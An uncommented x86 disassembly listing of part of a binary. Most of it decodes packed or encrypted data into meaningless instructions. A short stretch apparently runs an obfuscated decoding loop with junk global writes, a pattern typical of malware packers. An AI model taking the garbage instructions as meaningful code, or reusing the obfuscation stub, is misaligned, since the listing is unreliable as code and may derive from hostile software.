  4057e9:	mov    cl,0xf4
  4057eb:	retf   0xf194
  4057ee:	(bad)  
  4057ef:	xor    ebp,edi
  4057f1:	mov    WORD PTR [ebp-0x66323340],ds
  4057f7:	pusha  
  4057f8:	(bad)
  4057fc:	(bad)  
  4057fd:	cmp    eax,0xa5dfef37
  405802:	lea    ecx,[eax+ebx*1]
  405805:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405806:	add    dl,BYTE PTR [ecx-0x13db7b46]
  40580c:	xor    dl,BYTE PTR [ebx]
  40580e:	mov    dl,0x62
  405810:	das    
  405811:	inc    edx
  405813:	mov    eax,ds:0x3f456057
  405818:	sub    eax,esp
  40581a:	mov    edx,0x7b8e235e
  40581f:	movd   DWORD PTR [ecx-0x4ab4dcbc],mm2
  405826:	or     dl,cl
  405828:	in     eax,0xdb
  40582a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40582b:	jmp    0xa09d2827
  405830:	mov    bh,0xed
  405832:	jge    0x405852
  405834:	cmp    edi,DWORD PTR [ebx+0x73]
  405837:	push   ds
  405838:	sbb    DWORD PTR [ebx-0x69],esi
  40583b:	or     eax,0x6bb62a0e
  405840:	sub    al,0xe8
  405842:	cmp    al,BYTE PTR [edx+0xffd0aa2]
  405848:	jo     0x405834
  40584a:	jle    0x405802
  40584c:	sbb    BYTE PTR [ecx-0x3331c1d6],bh
  405852:	ins    BYTE PTR es:[edi],dx
  405853:	pop    edx
  405854:	sub    BYTE PTR [edi+0x6d3046c5],cl
  40585a:	jnp    0x40586f
  40585c:	push   edi
  40585d:	pop    esi
  40585e:	fwait
  40585f:	call   0xde8b2450
  405864:	push   edi
  405865:	stos   BYTE PTR es:[edi],al
  405866:	pusha  
  405867:	adc    cl,BYTE PTR [eax-0xc]
  40586a:	shl    BYTE PTR [eax-0x4b950f8b],1
  405870:	in     al,dx
  405871:	int    0xd6
  405873:	inc    ecx
  405874:	rcr    edx,0xf9
  405877:	lahf   
  405878:	mov    ds:0xceb28e31,al
  40587d:	pop    eax
  40587e:	push   esi
  40587f:	xchg   ebx,esi
  405881:	pop    esi
  405882:	mov    WORD PTR ds:0x3b72bd8d,gs
  405888:	cli    
  405889:	mov    ds:0x9110b4e5,al
  40588e:	ret    0x9535
  405891:	fisub  WORD PTR [ebx-0x34cde129]
  405897:	test   bl,ah
  405899:	and    eax,0xd4a58758
  40589e:	and    al,0xd2
  4058a0:	je     0x405878
  4058a2:	lock in al,0x23
  4058a5:	dec    ecx
  4058a6:	jne    0x405895
  4058a8:	test   cl,0xdb
  4058ab:	pop    edi
  4058ac:	xchg   edi,eax
  4058ad:	rcl    DWORD PTR [eax-0x67],cl
  4058b0:	dec    bx
  4058b2:	les    eax,FWORD PTR [edi+0x56]
  4058b5:	fwait
  4058b6:	xor    BYTE PTR [esi-0x5a167c04],ch
  4058bc:	dec    edx
  4058bd:	sar    BYTE PTR [esi+0x31869b8f],cl
  4058c3:	and    ch,BYTE PTR [edx+esi*4+0x3f]
  4058c7:	imul   edi
  4058c9:	xchg   edx,eax
  4058ca:	sub    DWORD PTR [esi],edi
  4058cc:	or     al,0xf1
  4058ce:	push   es
  4058cf:	rcl    BYTE PTR [ecx],0x91
  4058d2:	and    eax,0x224a3376
  4058d7:	push   edx
  4058d8:	mov    ebx,0x68257eb6
  4058dd:	and    DWORD PTR [si-0x56],0x11
  4058e2:	mov    eax,0xf8be9db4
  4058e7:	mov    edi,0x1c0b50b6
  4058ec:	leave  
  4058ed:	dec    esi
  4058ee:	ds addr16 pop edx
  4058f1:	push   bx
  4058f3:	or     DWORD PTR [ecx],ebx
  4058f5:	ss mov dh,0xd7
  4058f8:	mov    eax,0x92861dc3
  4058fd:	xor    al,0x70
  4058ff:	sbb    eax,0xeaab99d1
  405904:	mov    cs,esi
  405906:	xchg   esi,eax
  405907:	and    al,0x3d
  405909:	xchg   ecx,eax
  40590a:	sbb    DWORD PTR [edi+ebx*8-0x5219230d],0x40
  405912:	leave  
  405913:	push   esi
  405914:	adc    al,0x7a
  405916:	or     al,0x71
  405918:	jo     0x405940
  40591a:	push   es
  40591b:	rol    BYTE PTR [edi],0x48
  40591e:	dec    edi
  40591f:	js     0x405930
  405921:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405922:	dec    esp
  405923:	retf   0x4a51
  405926:	stc    
  405927:	push   ss
  405928:	stos   BYTE PTR es:[edi],al
  405929:	fdivr  QWORD PTR [ecx]
  40592b:	gs enter 0xa865,0x3
  405930:	div    DWORD PTR [esi]
  405932:	repz xchg esp,eax
  405934:	xor    DWORD PTR [edi-0x59],esp
  405937:	mov    ebx,DWORD PTR [ecx+0x10]
  40593a:	sub    ecx,esp
  40593c:	inc    ebx
  40593d:	(bad)  
  40593e:	push   0x3c6baa4f
  405943:	scas   al,BYTE PTR es:[edi]
  405944:	out    0x5b,al
  405946:	lahf   
  405947:	mov    edx,0x63027981
  40594c:	push   es
  40594d:	out    0x62,eax
  40594f:	(bad)  
  405950:	dec    ebx
  405951:	js     0x4059be
  405953:	pop    edx
  405954:	addr16 cs mov edx,0xe8d8f52
  40595b:	stos   DWORD PTR es:[edi],eax
  40595c:	cld    
  40595d:	xchg   ebp,eax
  40595e:	add    al,ch
  405960:	(bad)  
  405961:	sub    esi,edi
  405963:	hlt    
  405964:	fucom  st(2)
  405966:	shl    DWORD PTR [eax],0x48
  405969:	xor    ch,BYTE PTR [ebp+0x8]
  40596c:	push   es
  40596d:	add    esi,ebx
  40596f:	inc    edi
  405970:	mov    dl,0xa8
  405972:	int3   
  405973:	cmp    al,cl
  405975:	inc    ebp
  405976:	sar    BYTE PTR [eax+0x1b06ce85],0x69
  40597d:	xor    BYTE PTR [edx+0x4a],al
  405980:	sbb    ebx,DWORD PTR [ebp+0x8b427f6]
  405986:	fdiv   QWORD PTR [ebp+0x71]
  405989:	gs stos BYTE PTR es:[edi],al
  40598b:	push   0xfffffff7
  40598d:	repnz movs DWORD PTR es:[edi],DWORD PTR cs:[esi]
  405990:	sub    al,0xdd
  405992:	pushf  
  405993:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405994:	sbb    ebx,DWORD PTR [esp+edx*4+0x6b]
  405998:	test   BYTE PTR [edx-0x50089a53],dl
  40599e:	mov    ah,0xbe
  4059a0:	sar    BYTE PTR [ebx+ecx*1+0x67],cl
  4059a4:	cld    
  4059a5:	push   0xc9c54fb7
  4059aa:	std    
  4059ab:	mov    dl,0x67
  4059ad:	ins    DWORD PTR es:[edi],dx
  4059ae:	fadd   DWORD PTR [edx]
  4059b0:	dec    ebp
  4059b1:	inc    ebx
  4059b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059b3:	jmp    0x9e7ca809
  4059b8:	cld    
  4059b9:	sbb    DWORD PTR [esi-0x14d7d565],0x9bcc2dc
  4059c3:	mov    al,0xf8
  4059c5:	mov    esi,0xd9a9638
  4059ca:	sbb    cl,cl
  4059cc:	(bad)  
  4059cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059ce:	bswap  edx
  4059d0:	xchg   ebx,esi
  4059d2:	pop    esi
  4059d3:	xchg   BYTE PTR [esi+0x35f68e0b],dh
  4059d9:	and    eax,0x18939202
  4059de:	ret    
  4059df:	ja     0x4059ac
  4059e1:	inc    esp
  4059e2:	ret    
  4059e3:	je     0x4059e2
  4059e5:	sub    al,BYTE PTR [edx+0x50f00c1a]
  4059eb:	jmp    0x1103aac0
  4059f0:	arpl   WORD PTR [eax+0xe],sp
  4059f3:	pop    es
  4059f4:	fst    QWORD PTR [esi-0x3f]
  4059f7:	sbb    ebp,DWORD PTR [ebx+0x60788b3f]
  4059fd:	data16 scas al,BYTE PTR es:[edi]
  4059ff:	pop    edx
  405a00:	(bad)  
  405a01:	out    0xe8,al
  405a03:	add    bl,BYTE PTR [ebx+ebx*1]
  405a06:	hlt    
  405a07:	and    esp,DWORD PTR [ebx-0x446e332c]
  405a0d:	repz push es
  405a0f:	mov    dl,0x74
  405a11:	lods   eax,DWORD PTR ds:[esi]
  405a12:	in     al,dx
  405a13:	cmp    eax,0x9d3ff32f
  405a18:	ins    DWORD PTR es:[edi],dx
  405a19:	add    al,0x6b
  405a1b:	mov    cl,BYTE PTR [esi-0x79]
  405a1e:	in     al,dx
  405a1f:	cli    
  405a20:	outs   dx,DWORD PTR ds:[esi]
  405a21:	popf   
  405a22:	loopne 0x405a45
  405a24:	rol    DWORD PTR [ebx+ebp*2+0x50c8564e],1
  405a2b:	cmc    
  405a2c:	scas   al,BYTE PTR es:[edi]
  405a2d:	jns    0x4059cf
  405a2f:	xchg   edi,eax
  405a30:	adc    al,0x33
  405a33:	add    bh,ah
  405a35:	push   esp
  405a36:	call   0xf88ffa02
  405a3b:	sti    
  405a3c:	sub    edi,DWORD PTR [ebx+0x6b]
  405a3f:	adc    ah,dh
  405a41:	loopne 0x405a52
  405a43:	pop    ds
  405a44:	outs   dx,DWORD PTR ds:[esi]
  405a45:	pop    es
  405a46:	add    DWORD PTR [esi],ebx
  405a48:	sbb    DWORD PTR [eax],edx
  405a4a:	mov    esi,DWORD PTR [eax]
  405a4c:	shl    DWORD PTR [ebx+eiz*1],0x46
  405a50:	mov    ds:0x564e2dc3,eax
  405a55:	mov    edx,cs
  405a57:	add    dl,ch
  405a59:	in     eax,dx
  405a5a:	jp     0x4059f7
  405a5c:	xchg   esp,eax
  405a5d:	stos   DWORD PTR es:[edi],eax
  405a5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a5f:	call   0x7c84fbc
  405a64:	jmp    0x405a51
  405a66:	add    edx,DWORD PTR [eax]
  405a68:	and    edi,eax
  405a6a:	or     eax,0x768adcbe
  405a6f:	or     BYTE PTR [esi+0xb957efd],dh
  405a75:	outs   dx,DWORD PTR ds:[esi]
  405a76:	dec    ebx
  405a77:	add    ch,al
  405a79:	or     al,0xa2
  405a7b:	sub    DWORD PTR [esi+0x54c62263],ebx
  405a81:	adc    dl,BYTE PTR [ecx]
  405a83:	fnstsw WORD PTR [ecx-0x4315c3bc]
  405a89:	add    BYTE PTR [esi-0x2aae20e6],al
  405a8f:	leave  
  405a90:	pop    edi
  405a91:	add    eax,0x1ffe859d
  405a96:	mov    cl,0x4f
  405a98:	mov    al,0x9d
  405a9a:	mov    fs,ebp
  405a9c:	push   es
  405a9d:	popa   
  405a9e:	mov    eax,ds:0x8161b54d
  405aa3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405aa4:	mov    dl,0x43
  405aa6:	mov    eax,0x116ed947
  405aab:	in     al,dx
  405aac:	push   0x68660b35
  405ab1:	xor    ebx,ebp
  405ab3:	mov    esi,0xfafa81f5
  405ab8:	mov    edi,0xf25b9ded
  405abd:	loope  0x405b1d
  405abf:	daa    
  405ac0:	xor    ch,al
  405ac2:	sbb    edx,edx
  405ac4:	jp     0x405b2e
  405ac6:	push   edx
  405ac7:	mov    ch,0x9a
  405ac9:	add    ecx,DWORD PTR [ebp+0x36af0db0]
  405acf:	retf   0x8c21
  405ad2:	sub    dh,BYTE PTR [ebx-0x5a]
  405ad5:	pushf  
  405ad6:	in     eax,dx
  405ad7:	jb     0x405a5f
  405ad9:	mov    bl,0x1a
  405adb:	clc    
  405adc:	dec    esi
  405add:	idiv   BYTE PTR [ebx-0x52]
  405ae0:	je     0x405b24
  405ae2:	sub    DWORD PTR [esp+edi*2-0x76],ecx
  405ae6:	dec    ch
  405ae8:	pop    eax
  405ae9:	pop    ss
  405aea:	fwait
  405aeb:	(bad)  
  405aec:	(bad)  
  405aed:	pop    eax
  405aee:	pop    esi
  405aef:	retf   
  405af0:	nop
  405af1:	sub    dh,bh
  405af3:	dec    ebx
  405af4:	dec    ebx
  405af5:	es jno 0x405aa8
  405af8:	lds    esp,FWORD PTR [ebx]
  405afa:	pop    ds
  405afb:	call   0xf95c9b1c
  405b00:	xlat   BYTE PTR ds:[ebx]
  405b01:	imul   DWORD PTR [edx-0x3b395ea0]
  405b07:	push   cs
  405b08:	mov    ebx,0xe59dc7c5
  405b0d:	or     al,0x8f
  405b0f:	or     eax,0x31ce32c9
  405b14:	ret    
  405b15:	ror    al,1
  405b17:	and    al,0x16
  405b19:	jb     0x405ac7
  405b1b:	jno    0x405ade
  405b1d:	xor    eax,0xa3ffd609
  405b22:	sbb    ah,0xb1
  405b25:	aam    0xa5
  405b27:	aaa    
  405b28:	call   0x4f6a:0x8e6c3f23
  405b2f:	push   ebp
  405b30:	jo     0x405b8a
  405b32:	pusha  
  405b33:	push   0x3a
  405b35:	pop    ss
  405b36:	sbb    ch,BYTE PTR [esi]
  405b38:	push   ebx
  405b39:	test   eax,0x3df07153
  405b3e:	dec    ebx
  405b3f:	fidiv  WORD PTR [edi+0x63]
  405b42:	fisubr WORD PTR [eax-0x7c]
  405b45:	bnd je 0x405ae7
  405b48:	xor    ebp,DWORD PTR [ecx-0x74]
  405b4b:	stos   DWORD PTR es:[edi],eax
  405b4c:	cmovs  esp,DWORD PTR [edi+0x40f16b75]
  405b53:	popw   ss
  405b55:	push   ebp
  405b56:	sub    eax,0x9090a3ac
  405b5b:	push   edi
  405b5c:	mov    eax,0x59de791e
  405b61:	cmp    esi,DWORD PTR [ebp+0x43c266a9]
  405b67:	fcomp  DWORD PTR [esi+0x1a1d4197]
  405b6d:	das    
  405b6e:	sar    DWORD PTR [eax],1
  405b70:	sbb    eax,0x5a839602
  405b75:	and    DWORD PTR [esi+eiz*1+0x1e4b4c47],esp
  405b7c:	outs   dx,DWORD PTR ds:[esi]
  405b7d:	int3   
  405b7e:	retf   0xfd76
  405b81:	add    edx,edi
  405b83:	inc    eax
  405b84:	mov    ds:0xf443b760,eax
  405b89:	sub    eax,0x1dbd3fa3
  405b8e:	aas    
  405b8f:	and    ah,BYTE PTR [edi+0x24df36a0]
  405b95:	test   DWORD PTR [edx+0x47d84033],eax
  405b9b:	cs push edx
  405b9d:	arpl   WORD PTR [esi-0x19555f27],dx
  405ba3:	add    eax,0x35538bc7
  405ba8:	mov    bl,0xfd
  405baa:	push   ebp
  405bab:	xor    dl,BYTE PTR [edx+0x22]
  405bae:	mov    ah,0xfa
  405bb0:	mov    WORD PTR [ecx],es
  405bb2:	imul   edx,DWORD PTR [esi-0x51ba7f7b],0xffffffdd
  405bb9:	retf   
  405bba:	call   0x333d:0x2259a290
  405bc1:	int3   
  405bc2:	in     eax,dx
  405bc3:	(bad)  
  405bc4:	out    dx,eax
  405bc5:	jp     0x405bc5
  405bc7:	and    ebp,DWORD PTR [esi+0x1dc6bfed]
  405bcd:	mov    ebx,0xad6ba545
  405bd2:	inc    edx
  405bd3:	leave  
  405bd4:	in     al,dx
  405bd5:	ss mov ch,0x28
  405bd8:	iret   
  405bd9:	sub    edi,esi
  405bdb:	jecxz  0x405bc5
  405bdd:	jbe    0x405b93
  405bdf:	lods   eax,DWORD PTR ds:[esi]
  405be0:	(bad)  
  405be1:	(bad)  
  405be3:	dec    esp
  405be4:	mov    ecx,0x91aa233c
  405be9:	xchg   ecx,eax
  405bea:	lahf   
  405beb:	xor    ebx,ebp
  405bed:	in     al,dx
  405bee:	sbb    ecx,edx
  405bf0:	lea    esi,[eax]
  405bf2:	push   edx
  405bf3:	jle    0x405c52
  405bf5:	and    bh,ah
  405bf7:	ret    
  405bf8:	sub    BYTE PTR [edi-0x1b],ah
  405bfb:	imul   ebp,DWORD PTR [esi-0x40dfdd26],0x7c53f9bc
  405c05:	sar    ah,1
  405c07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c08:	hlt    
  405c09:	mov    ds:0xb10738b3,al
  405c0e:	ret    0xdc9f
  405c11:	xchg   esi,eax
  405c12:	xor    BYTE PTR [edi],ah
  405c14:	imul   ebx,DWORD PTR [ebp+edx*8-0x21],0x973b63a1
  405c1c:	mov    eax,0x1b1e4aca
  405c21:	je     0x405c36
  405c23:	jmp    0x405ba9
  405c25:	imul   ebx,edi,0x61
  405c28:	js     0x405beb
  405c2a:	and    ah,BYTE PTR [ebx-0x69]
  405c2d:	sub    al,0x2f
  405c2f:	and    ecx,DWORD PTR [ecx-0x7]
  405c32:	mov    BYTE PTR [ebp-0xc],ah
  405c35:	cdq    
  405c36:	adc    ch,bl
  405c38:	iret   
  405c39:	retf   
  405c3a:	sahf   
  405c3b:	inc    ebp
  405c3c:	mov    edx,0xc98326fe
  405c41:	adc    BYTE PTR [edi+0x5f],ah
  405c44:	ins    BYTE PTR es:[edi],dx
  405c45:	adc    eax,0xe920cb2d
  405c4a:	stos   BYTE PTR es:[edi],al
  405c4b:	mov    WORD PTR [ebx-0x2e],?
  405c4e:	ret    0x34fa
  405c51:	ja     0x405c2d
  405c53:	and    eax,ebx
  405c55:	mov    dh,0x23
  405c57:	sbb    edx,DWORD PTR [ebp+edi*8+0x73]
  405c5b:	pusha  
  405c5c:	inc    esi
  405c5d:	pushf  
  405c5e:	xchg   esi,ecx
  405c60:	test   eax,0x1104655e
  405c65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c66:	pop    edi
  405c67:	xchg   ebx,eax
  405c68:	add    ecx,edx
  405c6a:	sub    dl,BYTE PTR [edi]
  405c6c:	(bad)  
  405c6d:	jl     0x405c82
  405c6f:	loope  0x405cb2
  405c71:	lea    ebp,[edx+ecx*8-0x6553e685]
  405c78:	pop    edi
  405c79:	ret    0x7a5c
  405c7c:	in     eax,dx
  405c7d:	jge    0x405c72
  405c7f:	pop    ss
  405c80:	sub    esp,DWORD PTR [ebx]
  405c82:	add    al,0x19
  405c84:	jnp    0x405c15
  405c86:	push   0xffffffaf
  405c88:	mov    edx,0x2132907d
  405c8d:	mov    dl,BYTE PTR [edi]
  405c8f:	outs   dx,BYTE PTR ds:[esi]
  405c90:	and    BYTE PTR [ebp-0x79],cl
  405c93:	neg    DWORD PTR [esi+eiz*8+0x5174e96f]
  405c9a:	stc    
  405c9b:	sbb    al,0xad
  405c9d:	pop    ebp
  405c9e:	adc    bl,dh
  405ca0:	push   eax
  405ca1:	sbb    DWORD PTR [esi+eiz*8+0x42],esi
  405ca5:	dec    edx
  405ca6:	jb     0x405cf1
  405ca8:	imul   eax,DWORD PTR [esi],0xfffffffa
  405cab:	mov    ah,bh
  405cad:	xor    eax,0x6b91d00
  405cb2:	push   es
  405cb3:	sbb    edx,DWORD PTR [esi+0xa]
  405cb6:	jo     0x405c54
  405cb8:	pop    ebx
  405cb9:	mov    ebp,0x8a7d8110
  405cbe:	mov    ah,0x4e
  405cc0:	jbe    0x405c4c
  405cc2:	addr16 jbe 0x405c52
  405cc5:	dec    esp
  405cc6:	or     BYTE PTR [edx+0x72a27e8d],bh
  405ccc:	arpl   WORD PTR [eax-0x6ec87eab],cx
  405cd2:	repz rol BYTE PTR [esi-0x53513aac],0x60
  405cda:	ds popf 
  405cdc:	inc    edi
  405cdd:	adc    DWORD PTR [eax],ecx
  405cdf:	mov    ebp,0x81ebb58e
  405ce4:	and    DWORD PTR [eax],ebx
  405ce6:	xchg   ebx,eax
  405ce7:	shr    BYTE PTR [ebx],0xe2
  405cea:	or     ah,BYTE PTR [eax]
  405cec:	or     BYTE PTR [eax],al
  405cee:	retf   
  405cef:	fdivr  st(0),st
  405cf1:	cld    
  405cf2:	xchg   eax,eax
  405cf4:	jb     0x405d24
  405cf6:	mov    BYTE PTR [ebx],bh
  405cf8:	pushf  
  405cf9:	cmp    BYTE PTR [eax-0x6faeff3c],0x86
  405d00:	jmp    0x405cb8
  405d02:	cdq    
  405d03:	inc    ecx
  405d04:	nop
  405d05:	push   ebx
  405d06:	div    BYTE PTR [eax]
  405d08:	ins    BYTE PTR es:[edi],dx
  405d09:	and    eax,0xcf874a1
  405d0e:	or     ecx,DWORD PTR [ebx-0x61b76057]
  405d14:	dec    ecx
  405d15:	xchg   DWORD PTR [edx+0x0],ebx
  405d18:	push   ecx
  405d19:	(bad)  [edx-0xabef9b4]
  405d1f:	shl    BYTE PTR [edx+0x5244bc38],1
  405d25:	fadd   QWORD PTR [eax-0x4f44304c]
  405d2b:	bnd js 0x405d7d
  405d2e:	jle    0x405d73
  405d30:	lods   eax,DWORD PTR ds:[esi]
  405d31:	fst    DWORD PTR [edx+0x7b21d035]
  405d37:	aam    0xe9
  405d39:	int    0x25
  405d3b:	into   
  405d3c:	sar    BYTE PTR [eax+0x7c2e6dde],0x3f
  405d43:	lea    ebx,[edi+0x24]
  405d46:	aam    0x8b
  405d48:	inc    ebp
  405d49:	fmul   DWORD PTR [ebx+0x15f7e84d]
  405d4f:	fisub  DWORD PTR [edx-0x39ccffbe]
  405d55:	or     DWORD PTR ds:0x42a2fa,0xa4f
  405d5f:	xor    ecx,esi
  405d61:	or     DWORD PTR ds:0x42a26a,0x42a2f6
  405d6b:	add    eax,edi
  405d6d:	add    ecx,edi
  405d6f:	mov    BYTE PTR [ebp-0x21],dl
  405d72:	cmp    eax,ecx
  405d74:	jae    0x408235
  405d7a:	add    edx,DWORD PTR ds:0x42a2a2
  405d80:	lea    ecx,[eax-0x3272f1]
  405d86:	mov    DWORD PTR [ebp-0x14],ecx
  405d89:	sub    DWORD PTR ds:0x42a27a,0x2374
  405d93:	mov    edx,DWORD PTR [ebp-0x14]
  405d96:	add    DWORD PTR ds:0x42a2a2,0x6412
  405da0:	xor    edx,esi
  405da2:	add    edx,0x7f55d8fb
  405da8:	lea    ecx,[ebp+eax*4-0xb4]
  405daf:	mov    DWORD PTR ds:0x42a25a,0x798e
  405db9:	mov    DWORD PTR [ecx],edx
  405dbb:	mov    edx,0x1097
  405dc0:	mov    edx,DWORD PTR [ecx]
  405dc2:	cmp    edx,0x244ecb98
  405dc8:	jbe    0x405de3
  405dce:	xor    DWORD PTR ds:0x42a29a,0x42a2d6
  405dd8:	add    DWORD PTR [ecx],0x405fcd9
  405dde:	jmp    0x405de9
  405de3:	add    DWORD PTR [ecx],0xfdaf4327
  405de9:	or     DWORD PTR ds:0x42a2f6,edi
  405def:	mov    ecx,DWORD PTR [ebp-0x18]
  405df2:	xor    ecx,esi
  405df4:	and    DWORD PTR ds:0x42a25e,0x42a27a
  405dfe:	inc    eax
  405dff:	and    DWORD PTR ds:0x42a2aa,0x42a2a6
  405e09:	inc    DWORD PTR [ebp-0x14]
  405e0c:	add    ecx,edi
  405e0e:	mov    DWORD PTR ds:0x42a2f6,0x14dc
  405e18:	cmp    eax,ecx
  405e1a:	mov    DWORD PTR ds:0x42a2fe,0x33af
  405e24:	jb     0x405d89
  405e2a:	and    DWORD PTR ds:0x42a25e,0x0
  405e34:	mov    eax,ds:0x42a25e
  405e39:	inc    eax
  405e3a:	mov    ds:0x42a25e,eax
  405e3f:	cmp    DWORD PTR ds:0x42a25e,0x1c
  405e46:	jge    0x405e81
  405e4c:	jmp    0x405e74
  405e51:	push   0x42a28e
  405e56:	push   0x8ee8
  405e5b:	push   DWORD PTR [ebp-0xc]
  405e5e:	push   0x2324
  405e63:	push   0x4718
  405e68:	push   DWORD PTR [ebp-0x20]
  405e6b:	push   DWORD PTR [ebp-0x18]
  405e6e:	call   DWORD PTR ds:0x42a3ce
  405e74:	cmp    DWORD PTR ds:0x42a25e,0x18
  405e7b:	jb     0x405e34
  405e81:	mov    dl,BYTE PTR [ebp-0x21]
  405e84:	jmp    0x408235
  405e89:	test   eax,0xe897f33e
  405e8e:	add    BYTE PTR [ecx-0x2fc9eefa],0xf5
  405e95:	sti    
  405e96:	jle    0x405e8b
  405e98:	pop    bx
  405e9a:	cmp    al,BYTE PTR [ebx-0x7ca1107d]
  405ea0:	cmp    DWORD PTR [edi+0x22],0x20
  405ea4:	popa   
  405ea5:	mov    WORD PTR [edi+0x66],es
  405ea8:	ret    
  405ea9:	inc    esp
  405eaa:	mov    cl,0xce
  405eac:	xchg   esi,eax
  405ead:	(bad)  
  405eae:	retf   
  405eaf:	jno    0x405e94
  405eb1:	xchg   edx,eax
  405eb2:	adc    DWORD PTR [ebp+0x51ff8adc],0xa3e4162
  405ebc:	sbb    eax,0x15726a4
  405ec1:	cmp    DWORD PTR [eax+ebp*2+0x70],ebx
  405ec5:	push   edx
  405ec6:	xchg   ebp,eax
  405ec7:	dec    esp
  405ec8:	scas   eax,DWORD PTR es:[edi]
  405ec9:	jns    0x405f22
  405ecb:	fmul   QWORD PTR [ecx]
  405ecd:	(bad)  
  405ece:	sub    eax,0x58a345be
  405ed3:	or     eax,0x6ad1d7f3
  405ed8:	push   ebx
  405ed9:	adc    al,0x6e
  405edb:	jg     0x405efe
  405edd:	sub    bl,al
  405edf:	pop    ebx
  405ee0:	jmp    0xaf42:0x3de3038f
  405ee7:	lods   eax,DWORD PTR ds:[esi]
  405ee8:	jecxz  0x405e8f
  405eea:	cmp    edi,ebp
  405eec:	xchg   edi,eax
  405eed:	mov    bl,0xe8
  405eef:	cs ss mov esi,?
  405ef3:	mov    bh,0x55
  405ef5:	jmp    DWORD PTR [edx+0x50fb61fa]
  405efb:	leave  
  405efc:	test   eax,0xf3db79fb
  405f01:	fild   WORD PTR [ecx+0x20]
  405f04:	or     DWORD PTR [ebx+0x7449b598],ebp
  405f0a:	push   ebx
  405f0b:	push   edx
  405f0c:	xor    al,0xa3
  405f0e:	das    
  405f0f:	addr16 jno 0x405eff
  405f12:	pusha  
  405f13:	test   BYTE PTR [ecx-0x55e2d37d],dl
  405f19:	xchg   edx,ecx
  405f1b:	fisub  WORD PTR [edx-0x3de350ca]
  405f21:	xchg   ebp,eax
  405f22:	sub    ebp,DWORD PTR [ebx+0x4cdd0846]
  405f28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f29:	inc    ebx
  405f2a:	jae    0x405ebf
  405f2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f2d:	pop    es
  405f2e:	shl    ebx,cl
  405f30:	adc    eax,0xffeb8922
  405f35:	pop    edx
  405f36:	fsub   QWORD PTR [edx-0x72]
  405f39:	outs   dx,BYTE PTR ds:[esi]
  405f3a:	pop    esp
  405f3b:	sbb    eax,DWORD PTR [esi]
  405f3d:	mov    esi,0x8dca8e0b
  405f42:	repz pop eax
  405f44:	xor    ch,0xcb
  405f47:	test   al,0x49
  405f49:	cmp    BYTE PTR [ecx-0x43663420],bh
  405f4f:	scas   eax,DWORD PTR es:[edi]
  405f50:	aaa    
  405f51:	hlt    
  405f52:	xor    dh,al
  405f54:	add    BYTE PTR [esi-0xbcc657],ch
  405f5a:	sti    
  405f5b:	mov    edi,0x88bd2f8b
  405f60:	adc    DWORD PTR [eax],edx
  405f62:	dec    edx
  405f63:	adc    cl,dl
  405f65:	outs   dx,BYTE PTR ds:[esi]
  405f66:	dec    edi
  405f67:	and    al,0xc7
  405f69:	jnp    0x405f98
  405f6b:	sub    dh,BYTE PTR [ecx]
  405f6d:	bound  esi,QWORD PTR [eax-0x4c]
  405f70:	mov    BYTE PTR [esi+ebx*8-0x47],ah
  405f74:	es pop eax
  405f76:	push   edi
  405f77:	xchg   esp,eax
  405f78:	add    dh,ch
  405f7a:	inc    ecx
  405f7b:	fadd   DWORD PTR [ebx]
  405f7d:	mov    eax,ds:0xc38703c7
  405f82:	fld    DWORD PTR [eax+esi*8+0x5a15096e]
  405f89:	xor    DWORD PTR [ebp-0x623f6707],0xffffff86
  405f90:	mov    ds:0x5014d3fd,eax
  405f95:	lahf   
  405f96:	mov    ebp,0x56e2c9e1
  405f9b:	jg     0x405fb2
  405f9d:	mov    ebx,0x92fbed63
  405fa2:	pop    esi
  405fa3:	and    DWORD PTR [eax-0x6923d468],esp
  405fa9:	cld    
  405faa:	test   dh,0xb5
  405fad:	mov    edi,0xf14a2ab8
  405fb2:	mov    bh,0x59
  405fb4:	not    DWORD PTR [ecx-0x1a1f1e70]
  405fba:	inc    edi
  405fbc:	sub    eax,0x7310d1c4
  405fc1:	add    ebp,DWORD PTR [ebp-0xb]
  405fc4:	ficomp DWORD PTR [eax-0x25d3bafc]
  405fca:	cld    
  405fcb:	mov    BYTE PTR [ebx-0x30],bl
  405fce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405fcf:	(bad)  
  405fd0:	ins    DWORD PTR es:[edi],dx
  405fd1:	mov    ds:0xa1e7bd52,eax
  405fd6:	inc    edi
  405fd7:	cmp    al,0xdc
  405fd9:	adc    BYTE PTR [edi],al
  405fdb:	scas   al,BYTE PTR es:[edi]
  405fdc:	push   ss
  405fdd:	int    0x64
  405fdf:	lods   al,BYTE PTR ds:[esi]
  405fe0:	cmp    DWORD PTR [ebx+0x3f],ecx
  405fe3:	pop    ebp
  405fe4:	hlt    
  405fe5:	call   0x9ccfbf05
  405fea:	(bad)  
  405feb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405fec:	jne    0x406031
  405fee:	pop    eax
  405fef:	push   esi
  405ff0:	inc    esp
  405ff1:	adc    al,0xba
  405ff3:	and    eax,DWORD PTR [edx-0x48bf5753]
  405ff9:	ins    DWORD PTR es:[edi],dx
  405ffa:	stos   DWORD PTR es:[edi],eax
  405ffb:	inc    esp
  405ffc:	or     DWORD PTR [ebx-0x11],eax
  405fff:	retf   
  406000:	cwde   
  406001:	or     ch,BYTE PTR [edi]
  406003:	xchg   edx,eax
  406005:	cli    
  406006:	jge    0x406047
  406008:	fstp   st(3)
  40600a:	push   ebp
  40600b:	mov    edi,0x47d43e42
  406010:	popa   
  406011:	xor    DWORD PTR [ecx-0x54],ebx
  406014:	or     ebp,esp
  406016:	clc    
  406017:	and    DWORD PTR [eax-0xb175e81],0xc
  40601e:	popa   
  40601f:	nop
  406020:	pop    ebp
  406021:	enter  0x7e1a,0xd
  406025:	or     esi,eax
  406027:	sbb    bl,ah
  406029:	xlat   BYTE PTR ds:[ebx]
